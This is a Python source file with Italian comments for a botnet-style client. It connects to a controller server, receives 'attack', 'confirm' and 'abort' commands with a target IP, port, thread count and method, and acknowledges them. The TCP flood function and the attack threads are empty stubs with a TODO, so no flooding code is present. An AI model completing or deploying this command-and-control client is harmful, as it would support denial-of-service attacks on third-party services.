import socket
import threading

# Dati target
TYPE, IP, PORT , THREADS, METHOD = "", 0, 0, 0, ""
class ThreadManager:
    def __init__(self):
        self.threads = []

    def create_thread(self, target, args=()):
        thread = CustomThread(target=target, args=args)
        self.threads.append(thread)
        thread.start()
        return thread

    def abort_all_threads(self):
        for thread in self.threads:
            thread.abort()

    def join_all_threads(self):
        for thread in self.threads:
            thread.join()

    def remove_thread(self, thread):
        if thread in self.threads:
            self.threads.remove(thread)

    def clear_threads(self):
        self.threads = []

class CustomThread(threading.Thread):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._abort = threading.Event()

    def abort(self):
        self._abort.set()

    def run(self):
        while not self._abort.is_set():
            # Esegui il codice del thread qui
            pass  # Sostituisci con il tuo codice


class Attack:
    def TCP_FLOOD():
        pass

# Funzione per gestire i messaggi dal server
def receive_messages_from_server(client_socket):
    while True:
        # Ricevi dati dal server
        message = client_socket.recv(1024).decode('utf-8')

        # Se il messaggio è vuoto, il server si è disconnesso
        if not message:
            print("Il server si è disconnesso.")
            break
        
        TYPE, IP, PORT, THREADS, METHOD = message.split(" ")
        
        if TYPE == "attack":
            print(f"""
                Dati attacco:
                IP: {IP}
                PORT: {PORT}
                NUMERO THREADS: {THREADS}
                METODO: {METHOD}
                """)
        elif TYPE == "confirm":
            pass # TODO ingaggiare l'attacco
        elif TYPE == "abort":
            print("Terminating attack.")
        else:
            pass

        # Invia conferma al server
        client_socket.send("Conferma ricezione".encode('utf-8'))

# Funzione principale del client
def start_client(host, port):
    # Connessione al server
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host, port))

    # Avvia un thread per ricevere messaggi dal server
    receive_thread = threading.Thread(target=receive_messages_from_server, args=(client,))
    receive_thread.start()

    # Attendi che il thread di ricezione termini
    receive_thread.join()

    # Chiudi la connessione
    client.close()

# Avvia il client
if __name__ == "__main__":
    start_client('10.0.0.100', 20000)
